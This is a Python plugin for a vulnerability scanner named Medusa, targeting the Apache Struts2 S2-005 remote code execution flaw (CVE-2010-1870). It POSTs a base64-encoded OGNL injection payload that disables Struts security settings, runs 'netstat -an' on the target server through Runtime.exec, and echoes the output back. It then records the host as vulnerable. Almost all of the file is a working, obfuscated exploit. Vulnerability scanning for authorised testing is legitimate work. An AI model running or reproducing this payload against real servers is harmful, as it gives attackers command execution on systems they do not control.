#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import requests
from Modules.Struts2.CriticalResult import Result
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2010-1870" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2010-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability5"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞5' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "Struts2.0.0–Struts2.1.8.1"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    data=base64.b64decode(
        "KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp")

    try:
        payload_url = scheme + "://" + url +":"+ str(port)+"/index.action"
        headers = {
            'User-Agent': RandomAgent,
            "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        resp = requests.post(payload_url,headers=headers,data=data,proxies=proxies, timeout=6, verify=False)
        con = resp.text
        resilt=Result(con)
        if resilt=="Linux" or resilt=="NoteOS" or resilt=="Windows":
            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n版本号:S2-005\r\n返回数据:{}\r\n部署系统:{}\r\n".format(url,con,resilt)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类